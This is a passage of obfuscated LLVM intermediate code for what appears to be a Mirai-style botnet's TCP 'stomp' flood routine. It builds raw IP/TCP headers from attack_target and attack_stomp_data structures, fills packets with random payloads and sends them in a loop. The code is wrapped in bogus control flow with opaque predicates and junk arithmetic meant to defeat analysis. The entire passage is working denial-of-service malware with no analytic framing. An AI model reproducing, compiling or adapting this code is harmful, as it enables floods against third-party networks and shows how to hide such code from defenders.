  %901 = sext i32 %900 to i64
  %902 = add i64 20, %901
  %903 = trunc i64 %902 to i32
  %904 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %892, i8* %894, i16 zeroext %899, i32 %903)
  %905 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %906 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %905, i32 0, i32 6
  store i16 %904, i16* %906, align 4
  %907 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %908 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %907, i32 0, i32 1
  %909 = load i16, i16* %908, align 2
  %910 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %911 = load i32, i32* %9, align 4
  %912 = sext i32 %911 to i64
  %913 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %910, i64 %912
  %914 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %913, i32 0, i32 0
  %915 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %914, i32 0, i32 1
  store i16 %909, i16* %915, align 2
  %916 = load i32, i32* %10, align 4
  %917 = load i8*, i8** %39, align 8
  %918 = load i32, i32* %24, align 4
  %919 = sext i32 %918 to i64
  %920 = add i64 40, %919
  %921 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %922 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %923 = load i32, i32* %9, align 4
  %924 = sext i32 %923 to i64
  %925 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %922, i64 %924
  %926 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %925, i32 0, i32 0
  %927 = bitcast %struct.sockaddr_in* %926 to %struct.sockaddr*
  store %struct.sockaddr* %927, %struct.sockaddr** %921, align 8
  %928 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %929 = load %struct.sockaddr*, %struct.sockaddr** %928, align 8
  %930 = call i64 @sendto(i32 %916, i8* %917, i64 %920, i32 16384, %struct.sockaddr* %929, i32 16)
  %931 = load i32, i32* @x.29
  %932 = load i32, i32* @y.30
  %933 = sub i32 %931, 1
  %934 = mul i32 %931, %933
  %935 = urem i32 %934, 2
  %936 = icmp eq i32 %935, 0
  %937 = icmp slt i32 %932, 10
  %938 = or i1 %936, %937
  br i1 %938, label %originalBBpart2373, label %originalBB347alteredBB

originalBBpart2373:                               ; preds = %originalBB347
  br label %939

; <label>:939:                                    ; preds = %originalBBpart2373
  %940 = load i32, i32* %9, align 4
  %941 = add nsw i32 %940, 1
  store i32 %941, i32* %9, align 4
  br label %769

; <label>:942:                                    ; preds = %originalBBpart2337
  %943 = load i32, i32* @x.29
  %944 = load i32, i32* @y.30
  %945 = sub i32 %943, 1
  %946 = mul i32 %943, %945
  %947 = urem i32 %946, 2
  %948 = icmp eq i32 %947, 0
  %949 = icmp slt i32 %944, 10
  %950 = or i1 %948, %949
  br i1 %950, label %originalBB375, label %originalBB375alteredBB

originalBB375:                                    ; preds = %originalBB375alteredBB, %942
  %951 = load i32, i32* @x.29
  %952 = load i32, i32* @y.30
  %953 = sub i32 %951, 1
  %954 = mul i32 %951, %953
  %955 = urem i32 %954, 2
  %956 = icmp eq i32 %955, 0
  %957 = icmp slt i32 %952, 10
  %958 = or i1 %956, %957
  br i1 %958, label %originalBBpart2377, label %originalBB375alteredBB

originalBBpart2377:                               ; preds = %originalBB375
  br label %752

; <label>:959:                                    ; preds = %originalBBpart243, %127, %105
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %106
  store i32 1, i32* %9, align 4
  %960 = load i32, i32* %10, align 4
  %961 = bitcast i32* %9 to i8*
  %962 = call i32 @setsockopt(i32 %960, i32 0, i32 3, i8* %961, i32 4) #6
  %963 = icmp eq i32 %962, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %130
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %153
  %964 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %964, i32* %26, align 4
  %965 = icmp eq i32 %964, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %188
  %966 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %967 = load i32, i32* %9, align 4
  %968 = sext i32 %967 to i64
  %969 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %966, i64 %968
  %970 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %969, i32 0, i32 1
  %971 = load i32, i32* %970, align 4
  %972 = call i32 @ntohl(i32 %971) #7
  %973 = call i32 @rand_next()
  %974 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %975 = load i32, i32* %9, align 4
  %976 = sext i32 %975 to i64
  %977 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %974, i64 %976
  %978 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %977, i32 0, i32 2
  %979 = load i8, i8* %978, align 4
  %980 = zext i8 %979 to i32
  %_ = shl i32 %973, %980
  %981 = lshr i32 %973, %980
  %_11 = shl i32 %972, %981
  %_12 = sub i32 %972, %981
  %gen = mul i32 %_12, %981
  %_13 = sub i32 0, %972
  %gen14 = add i32 %_13, %981
  %_15 = shl i32 %972, %981
  %_16 = sub i32 %972, %981
  %gen17 = mul i32 %_16, %981
  %_18 = shl i32 %972, %981
  %_19 = sub i32 0, %972
  %gen20 = add i32 %_19, %981
  %_21 = sub i32 0, %972
  %gen22 = add i32 %_21, %981
  %_23 = sub i32 %972, %981
  %gen24 = mul i32 %_23, %981
  %982 = add i32 %972, %981
  %983 = call i32 @htonl(i32 %982) #7
  %984 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %985 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %984, i32 0, i32 0
  store i32 %983, i32* %985, align 4
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %225
  %986 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %987 = load i32, i32* %9, align 4
  %988 = sext i32 %987 to i64
  %989 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %986, i64 %988
  %990 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %989, i32 0, i32 1
  %991 = load i32, i32* %990, align 4
  %992 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %993 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %992, i32 0, i32 0
  store i32 %991, i32* %993, align 4
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %250
  %994 = load i16, i16* %17, align 2
  %995 = zext i16 %994 to i32
  %996 = icmp eq i32 %995, 65535
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %279
  %997 = load i32, i32* %26, align 4
  %998 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %999 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %999, %struct.sockaddr** %998, align 8
  %1000 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %1001 = load %struct.sockaddr*, %struct.sockaddr** %1000, align 8
  %1002 = call i32 @connect(i32 %997, %struct.sockaddr* %1001, i32 16)
  %1003 = call i64 @time(i64* null) #6
  store i64 %1003, i64* %31, align 8
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %314
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %355
  %1004 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %1005 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1004, i32 0, i32 4
  %1006 = load i16, i16* %1005, align 4
  %_46 = sub i16 %1006, 9
  %gen47 = mul i16 %_46, 9
  %_48 = shl i16 %1006, 9
  %_49 = sub i16 %1006, 9
  %gen50 = mul i16 %_49, 9
  %_51 = sub i16 %1006, 9
  %gen52 = mul i16 %_51, 9
  %_53 = shl i16 %1006, 9
  %_54 = sub i16 0, %1006
  %gen55 = add i16 %_54, 9
  %_56 = shl i16 %1006, 9
  %_57 = sub i16 0, %1006
  %gen58 = add i16 %_57, 9
  %1007 = lshr i16 %1006, 9
  %_59 = shl i16 %1007, 1
  %_60 = sub i16 %1007, 1
  %gen61 = mul i16 %_60, 1
  %1008 = and i16 %1007, 1
  %1009 = zext i16 %1008 to i32
  %1010 = icmp ne i32 %1009, 0
  br label %originalBB45

originalBB65alteredBB:                            ; preds = %originalBB65, %482
  %1011 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1012 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1011, i32 0, i32 6
  store i8 6, i8* %1012, align 1
  %1013 = load i32, i32* @LOCAL_ADDR, align 4
  %1014 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1015 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1014, i32 0, i32 8
  store i32 %1013, i32* %1015, align 4
  %1016 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1017 = load i32, i32* %9, align 4
  %1018 = sext i32 %1017 to i64
  %1019 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1016, i64 %1018
  %1020 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1019, i32 0, i32 0
  %1021 = load i32, i32* %1020, align 4
  %1022 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %1023 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1022, i32 0, i32 9
  store i32 %1021, i32* %1023, align 4
  %1024 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1025 = load i32, i32* %9, align 4
  %1026 = sext i32 %1025 to i64
  %1027 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1024, i64 %1026
  %1028 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1027, i32 0, i32 3
  %1029 = load i16, i16* %1028, align 4
  %1030 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1031 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1030, i32 0, i32 0
  store i16 %1029, i16* %1031, align 4
  %1032 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1033 = load i32, i32* %9, align 4
  %1034 = sext i32 %1033 to i64
  %1035 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1032, i64 %1034
  %1036 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1035, i32 0, i32 4
  %1037 = load i16, i16* %1036, align 2
  %1038 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1039 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1038, i32 0, i32 1
  store i16 %1037, i16* %1039, align 2
  %1040 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1041 = load i32, i32* %9, align 4
  %1042 = sext i32 %1041 to i64
  %1043 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1040, i64 %1042
  %1044 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1043, i32 0, i32 2
  %1045 = load i32, i32* %1044, align 4
  %1046 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1047 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1046, i32 0, i32 2
  store i32 %1045, i32* %1047, align 4
  %1048 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1049 = load i32, i32* %9, align 4
  %1050 = sext i32 %1049 to i64
  %1051 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1048, i64 %1050
  %1052 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1051, i32 0, i32 1
  %1053 = load i32, i32* %1052, align 4
  %1054 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1055 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1054, i32 0, i32 3
  store i32 %1053, i32* %1055, align 4
  %1056 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1057 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1056, i32 0, i32 4
  %1058 = load i16, i16* %1057, align 4
  %_66 = sub i16 0, %1058
  %gen67 = add i16 %_66, -241
  %_68 = sub i16 %1058, -241
  %gen69 = mul i16 %_68, -241
  %_70 = sub i16 0, %1058
  %gen71 = add i16 %_70, -241
  %_72 = shl i16 %1058, -241
  %_73 = sub i16 0, %1058
  %gen74 = add i16 %_73, -241
  %_75 = sub i16 %1058, -241
  %gen76 = mul i16 %_75, -241
  %1059 = and i16 %1058, -241
  %_77 = shl i16 %1059, 128
  %_78 = sub i16 %1059, 128
  %gen79 = mul i16 %_78, 128
  %_80 = sub i16 %1059, 128
  %gen81 = mul i16 %_80, 128
  %_82 = sub i16 %1059, 128
  %gen83 = mul i16 %_82, 128
  %_84 = sub i16 0, %1059
  %gen85 = add i16 %_84, 128
  %1060 = or i16 %1059, 128
  store i16 %1060, i16* %1057, align 4
  %1061 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1062 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1061, i32 0, i32 4
  %1063 = load i16, i16* %1062, align 4
  %_86 = sub i16 0, %1063
  %gen87 = add i16 %_86, -257
  %_88 = sub i16 0, %1063
  %gen89 = add i16 %_88, -257
  %_90 = sub i16 %1063, -257
  %gen91 = mul i16 %_90, -257
  %_92 = sub i16 0, %1063
  %gen93 = add i16 %_92, -257
  %1064 = and i16 %1063, -257
  %_94 = sub i16 0, %1064
  %gen95 = add i16 %_94, 256
  %_96 = sub i16 0, %1064
  %gen97 = add i16 %_96, 256
  %_98 = shl i16 %1064, 256
  %_99 = sub i16 0, %1064
  %gen100 = add i16 %_99, 256
  %_101 = sub i16 0, %1064
  %gen102 = add i16 %_101, 256
  %1065 = or i16 %1064, 256
  store i16 %1065, i16* %1062, align 4
  %1066 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1067 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1066, i32 0, i32 4
  %1068 = load i16, i16* %1067, align 4
  %_103 = sub i16 0, %1068
  %gen104 = add i16 %_103, -4097
  %1069 = and i16 %1068, -4097
  %_105 = shl i16 %1069, 4096
  %_106 = sub i16 0, %1069
  %gen107 = add i16 %_106, 4096
  %_108 = shl i16 %1069, 4096
  %_109 = shl i16 %1069, 4096
  %_110 = sub i16 0, %1069
  %gen111 = add i16 %_110, 4096
  %1070 = or i16 %1069, 4096
  store i16 %1070, i16* %1067, align 4
  %1071 = call i32 @rand_next()
  %_112 = shl i32 %1071, 65535
  %_113 = sub i32 %1071, 65535
  %gen114 = mul i32 %_113, 65535
  %_115 = sub i32 0, %1071
  %gen116 = add i32 %_115, 65535
  %1072 = and i32 %1071, 65535
  %1073 = trunc i32 %1072 to i16
  %1074 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1075 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1074, i32 0, i32 5
  store i16 %1073, i16* %1075, align 2
  %1076 = load i8, i8* %18, align 1
  %1077 = sext i8 %1076 to i16
  %1078 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1079 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1078, i32 0, i32 4
  %1080 = load i16, i16* %1079, align 4
  %_117 = sub i16 0, %1077
  %gen118 = add i16 %_117, 1
  %_119 = sub i16 %1077, 1
  %gen120 = mul i16 %_119, 1
  %_121 = sub i16 %1077, 1
  %gen122 = mul i16 %_121, 1
  %_123 = sub i16 %1077, 1
  %gen124 = mul i16 %_123, 1
  %_125 = sub i16 0, %1077
  %gen126 = add i16 %_125, 1
  %_127 = shl i16 %1077, 1
  %_128 = shl i16 %1077, 1
  %_129 = sub i16 0, %1077
  %gen130 = add i16 %_129, 1
  %1081 = and i16 %1077, 1
  %_131 = sub i16 0, %1081
  %gen132 = add i16 %_131, 13
  %_133 = sub i16 %1081, 13
  %gen134 = mul i16 %_133, 13
  %_135 = shl i16 %1081, 13
  %_136 = sub i16 0, %1081
  %gen137 = add i16 %_136, 13
  %_138 = shl i16 %1081, 13
  %_139 = sub i16 0, %1081
  %gen140 = add i16 %_139, 13
  %_141 = sub i16 0, %1081
  %gen142 = add i16 %_141, 13
  %_143 = shl i16 %1081, 13
  %1082 = shl i16 %1081, 13
  %_144 = sub i16 0, %1080
  %gen145 = add i16 %_144, -8193
  %_146 = shl i16 %1080, -8193
  %1083 = and i16 %1080, -8193
  %_147 = sub i16 %1083, %1082
  %gen148 = mul i16 %_147, %1082
  %1084 = or i16 %1083, %1082
  store i16 %1084, i16* %1079, align 4
  %1085 = load i8, i8* %19, align 1
  %1086 = sext i8 %1085 to i16
  %1087 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1088 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1087, i32 0, i32 4
  %1089 = load i16, i16* %1088, align 4
  %_149 = sub i16 %1086, 1
  %gen150 = mul i16 %_149, 1
  %_151 = shl i16 %1086, 1
  %_152 = sub i16 0, %1086
  %gen153 = add i16 %_152, 1
  %_154 = sub i16 %1086, 1
  %gen155 = mul i16 %_154, 1
  %_156 = sub i16 0, %1086
  %gen157 = add i16 %_156, 1
  %_158 = sub i16 %1086, 1
  %gen159 = mul i16 %_158, 1
  %_160 = sub i16 0, %1086
  %gen161 = add i16 %_160, 1
  %1090 = and i16 %1086, 1
  %_162 = sub i16 0, %1090
  %gen163 = add i16 %_162, 12
  %_164 = sub i16 0, %1090
  %gen165 = add i16 %_164, 12
  %_166 = shl i16 %1090, 12
  %_167 = sub i16 0, %1090
  %gen168 = add i16 %_167, 12
  %_169 = shl i16 %1090, 12
  %_170 = shl i16 %1090, 12
  %1091 = shl i16 %1090, 12
  %_171 = sub i16 %1089, -4097
  %gen172 = mul i16 %_171, -4097
  %_173 = shl i16 %1089, -4097
  %_174 = sub i16 %1089, -4097
  %gen175 = mul i16 %_174, -4097
  %_176 = shl i16 %1089, -4097
  %_177 = sub i16 0, %1089
  %gen178 = add i16 %_177, -4097
  %_179 = sub i16 0, %1089
  %gen180 = add i16 %_179, -4097
  %_181 = shl i16 %1089, -4097
  %1092 = and i16 %1089, -4097
  %_182 = shl i16 %1092, %1091
  %1093 = or i16 %1092, %1091
  store i16 %1093, i16* %1088, align 4
  %1094 = load i8, i8* %20, align 1
  %1095 = sext i8 %1094 to i16
  %1096 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1097 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1096, i32 0, i32 4
  %1098 = load i16, i16* %1097, align 4
  %1099 = and i16 %1095, 1
  %_183 = sub i16 0, %1099
  %gen184 = add i16 %_183, 11
  %_185 = shl i16 %1099, 11
  %_186 = shl i16 %1099, 11
  %_187 = sub i16 0, %1099
  %gen188 = add i16 %_187, 11
  %_189 = sub i16 %1099, 11
  %gen190 = mul i16 %_189, 11
  %_191 = sub i16 %1099, 11
  %gen192 = mul i16 %_191, 11
  %_193 = sub i16 0, %1099
  %gen194 = add i16 %_193, 11
  %_195 = sub i16 0, %1099
  %gen196 = add i16 %_195, 11
  %_197 = sub i16 %1099, 11
  %gen198 = mul i16 %_197, 11
  %1100 = shl i16 %1099, 11
  %_199 = shl i16 %1098, -2049
  %_200 = sub i16 %1098, -2049
  %gen201 = mul i16 %_200, -2049
  %_202 = sub i16 %1098, -2049
  %gen203 = mul i16 %_202, -2049
  %_204 = sub i16 %1098, -2049
  %gen205 = mul i16 %_204, -2049
  %1101 = and i16 %1098, -2049
  %_206 = sub i16 %1101, %1100
  %gen207 = mul i16 %_206, %1100
  %_208 = shl i16 %1101, %1100
  %_209 = shl i16 %1101, %1100
  %1102 = or i16 %1101, %1100
  store i16 %1102, i16* %1097, align 4
  %1103 = load i8, i8* %21, align 1
  %1104 = sext i8 %1103 to i16
  %1105 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1106 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1105, i32 0, i32 4
  %1107 = load i16, i16* %1106, align 4
  %_210 = shl i16 %1104, 1
  %_211 = sub i16 0, %1104
  %gen212 = add i16 %_211, 1
  %_213 = sub i16 %1104, 1
  %gen214 = mul i16 %_213, 1
  %_215 = sub i16 %1104, 1
  %gen216 = mul i16 %_215, 1
  %1108 = and i16 %1104, 1
  %_217 = sub i16 0, %1108
  %gen218 = add i16 %_217, 10
  %_219 = shl i16 %1108, 10
  %_220 = shl i16 %1108, 10
  %1109 = shl i16 %1108, 10
  %_221 = sub i16 0, %1107
  %gen222 = add i16 %_221, -1025
  %_223 = sub i16 %1107, -1025
  %gen224 = mul i16 %_223, -1025
  %_225 = sub i16 0, %1107
  %gen226 = add i16 %_225, -1025
  %_227 = sub i16 %1107, -1025
  %gen228 = mul i16 %_227, -1025
  %_229 = sub i16 %1107, -1025
  %gen230 = mul i16 %_229, -1025
  %_231 = sub i16 0, %1107
  %gen232 = add i16 %_231, -1025
  %_233 = sub i16 0, %1107
  %gen234 = add i16 %_233, -1025
  %1110 = and i16 %1107, -1025
  %_235 = sub i16 0, %1110
  %gen236 = add i16 %_235, %1109
  %_237 = sub i16 %1110, %1109
  %gen238 = mul i16 %_237, %1109
  %_239 = shl i16 %1110, %1109
  %1111 = or i16 %1110, %1109
  store i16 %1111, i16* %1106, align 4
  %1112 = load i8, i8* %22, align 1
  %1113 = sext i8 %1112 to i16
  %1114 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1114, i32 0, i32 4
  %1116 = load i16, i16* %1115, align 4
  %_240 = sub i16 %1113, 1
  %gen241 = mul i16 %_240, 1
  %_242 = shl i16 %1113, 1
  %_243 = sub i16 %1113, 1
  %gen244 = mul i16 %_243, 1
  %_245 = sub i16 %1113, 1
  %gen246 = mul i16 %_245, 1
  %_247 = sub i16 %1113, 1
  %gen248 = mul i16 %_247, 1
  %1117 = and i16 %1113, 1
  %_249 = shl i16 %1117, 9
  %_250 = shl i16 %1117, 9
  %1118 = shl i16 %1117, 9
  %_251 = shl i16 %1116, -513
  %_252 = sub i16 0, %1116
  %gen253 = add i16 %_252, -513
  %1119 = and i16 %1116, -513
  %_254 = sub i16 %1119, %1118
  %gen255 = mul i16 %_254, %1118
  %_256 = sub i16 0, %1119
  %gen257 = add i16 %_256, %1118
  %_258 = shl i16 %1119, %1118
  %_259 = shl i16 %1119, %1118
  %1120 = or i16 %1119, %1118
  store i16 %1120, i16* %1115, align 4
  %1121 = load i8, i8* %23, align 1
  %1122 = sext i8 %1121 to i16
  %1123 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %1124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1123, i32 0, i32 4
  %1125 = load i16, i16* %1124, align 4
  %_260 = sub i16 %1122, 1
  %gen261 = mul i16 %_260, 1
  %_262 = shl i16 %1122, 1
  %_263 = shl i16 %1122, 1
  %_264 = sub i16 0, %1122
  %gen265 = add i16 %_264, 1
  %1126 = and i16 %1122, 1
  %_266 = sub i16 %1126, 8
  %gen267 = mul i16 %_266, 8
  %1127 = shl i16 %1126, 8
  %_268 = shl i16 %1125, -257
  %_269 = shl i16 %1125, -257
  %_270 = shl i16 %1125, -257
  %_271 = shl i16 %1125, -257
  %1128 = and i16 %1125, -257
  %_272 = sub i16 0, %1128
  %gen273 = add i16 %_272, %1127
  %1129 = or i16 %1128, %1127
  store i16 %1129, i16* %1124, align 4
  %1130 = load i8*, i8** %38, align 8
  %1131 = load i32, i32* %24, align 4
  call void @rand_str(i8* %1130, i32 %1131)
  br label %originalBB65

originalBB277alteredBB:                           ; preds = %originalBB277, %628
  %1132 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %1133 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1132, i32 0, i32 4
  %1134 = load i16, i16* %1133, align 4
  %_278 = sub i16 0, %1134
  %gen279 = add i16 %_278, 10
  %_280 = sub i16 0, %1134
  %gen281 = add i16 %_280, 10
  %_282 = shl i16 %1134, 10
  %_283 = sub i16 0, %1134
  %gen284 = add i16 %_283, 10
  %_285 = shl i16 %1134, 10
  %1135 = lshr i16 %1134, 10
  %_286 = sub i16 0, %1135
  %gen287 = add i16 %_286, 1
  %1136 = and i16 %1135, 1
  %1137 = zext i16 %1136 to i32
  %1138 = icmp ne i32 %1137, 0
  br label %originalBB277

originalBB291alteredBB:                           ; preds = %originalBB291, %652
  %1139 = load i32, i32* %26, align 4
  %1140 = call i32 @close(i32 %1139)
  br label %originalBB291

originalBB295alteredBB:                           ; preds = %originalBB295, %672
  br label %originalBB295

originalBB299alteredBB:                           ; preds = %originalBB299, %690
  %1141 = call i64 @time(i64* null) #6
  %1142 = load i64, i64* %31, align 8
  %_300 = sub i64 0, %1141
  %gen301 = add i64 %_300, %1142
  %_302 = sub i64 0, %1141
  %gen303 = add i64 %_302, %1142
  %_304 = sub i64 0, %1141
  %gen305 = add i64 %_304, %1142
  %_306 = sub i64 0, %1141
  %gen307 = add i64 %_306, %1142
  %_308 = sub i64 %1141, %1142
  %gen309 = mul i64 %_308, %1142
  %1143 = sub nsw i64 %1141, %1142
  %1144 = icmp sgt i64 %1143, 10
  br label %originalBB299

originalBB313alteredBB:                           ; preds = %originalBB313, %711
  %1145 = load i32, i32* %26, align 4
  %1146 = call i32 @close(i32 %1145)
  br label %originalBB313

originalBB317alteredBB:                           ; preds = %originalBB317, %732
  %1147 = load i32, i32* %9, align 4
  %_318 = sub i32 0, %1147
  %gen319 = add i32 %_318, 1
  %_320 = sub i32 0, %1147
  %gen321 = add i32 %_320, 1
  %_322 = sub i32 %1147, 1
  %gen323 = mul i32 %_322, 1
  %_324 = sub i32 %1147, 1
  %gen325 = mul i32 %_324, 1
  %_326 = sub i32 0, %1147
  %gen327 = add i32 %_326, 1
  %1148 = add nsw i32 %1147, 1
  store i32 %1148, i32* %9, align 4
  br label %originalBB317

originalBB331alteredBB:                           ; preds = %originalBB331, %752
  store i32 0, i32* %9, align 4
  br label %originalBB331

originalBB335alteredBB:                           ; preds = %originalBB335, %769
  %1149 = load i32, i32* %9, align 4
  %1150 = load i8, i8* %5, align 1
  %1151 = zext i8 %1150 to i32
  %1152 = icmp slt i32 %1149, %1151
  br label %originalBB335

originalBB339alteredBB:                           ; preds = %originalBB339, %790
  %1153 = load i8**, i8*** %12, align 8
  %1154 = load i32, i32* %9, align 4
  %1155 = sext i32 %1154 to i64
  %1156 = getelementptr inbounds i8*, i8** %1153, i64 %1155
  %1157 = load i8*, i8** %1156, align 8
  store i8* %1157, i8** %39, align 8
  %1158 = load i8*, i8** %39, align 8
  %1159 = bitcast i8* %1158 to %struct.iphdr*
  store %struct.iphdr* %1159, %struct.iphdr** %40, align 8
  %1160 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1160, i64 1
  %1162 = bitcast %struct.iphdr* %1161 to %struct.tcphdr*
  store %struct.tcphdr* %1162, %struct.tcphdr** %41, align 8
  %1163 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1164 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1163, i64 1
  %1165 = bitcast %struct.tcphdr* %1164 to i8*
  store i8* %1165, i8** %42, align 8
  %1166 = load i16, i16* %14, align 2
  %1167 = zext i16 %1166 to i32
  %1168 = icmp eq i32 %1167, 65535
  br label %originalBB339

originalBB343alteredBB:                           ; preds = %originalBB343, %832
  %1169 = load i8*, i8** %42, align 8
  %1170 = load i32, i32* %24, align 4
  call void @rand_str(i8* %1169, i32 %1170)
  br label %originalBB343

originalBB347alteredBB:                           ; preds = %originalBB347, %851
  %1171 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1171, i32 0, i32 7
  store i16 0, i16* %1172, align 2
  %1173 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1174 = bitcast %struct.iphdr* %1173 to i16*
  %1175 = call zeroext i16 @checksum_generic(i16* %1174, i32 20)
  %1176 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %1177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %1176, i32 0, i32 7
  store i16 %1175, i16* %1177, align 2
  %1178 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1179 = load i32, i32* %9, align 4
  %1180 = sext i32 %1179 to i64
  %1181 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1178, i64 %1180
  %1182 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1181, i32 0, i32 1
  %1183 = load i32, i32* %1182, align 4
  %_348 = sub i32 %1183, 1
  %gen349 = mul i32 %_348, 1
  %_350 = shl i32 %1183, 1
  %1184 = add i32 %1183, 1
  store i32 %1184, i32* %1182, align 4
  %1185 = trunc i32 %1183 to i16
  %1186 = call zeroext i16 @htons(i16 zeroext %1185) #7
  %1187 = zext i16 %1186 to i32
  %1188 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %1189 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1188, i32 0, i32 2
  store i32 %1187, i32* %1189, align 4
  %1190 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %1191 = load i32, i32* %9, align 4
  %1192 = sext i32 %1191 to i64
  %1193 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %1190, i64 %1192
